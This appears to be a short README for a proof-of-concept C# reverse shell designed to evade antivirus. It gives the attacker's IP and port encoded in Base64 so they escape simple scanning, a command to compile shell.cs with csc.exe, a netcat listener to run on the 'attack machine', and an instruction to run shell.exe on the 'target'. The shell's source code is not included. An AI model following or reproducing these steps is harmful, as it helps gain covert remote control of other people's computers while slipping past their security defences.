# C# Reverse Shell AV Evasion POC

## Update the LHOST and LPORT in the code
- **Base64 encoded listener IP**: `MTkyLjE2OC41LjU=` → `192.168.5.5`
- **Base64 encoded listening port**: `NDQ1NQ==` → `4455`

## Compile

`C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe shell.cs`


## Start the Listener on the attack machiine

`nc -nvlp 4455`


## Trigger the binary on the target

`shell.exe`


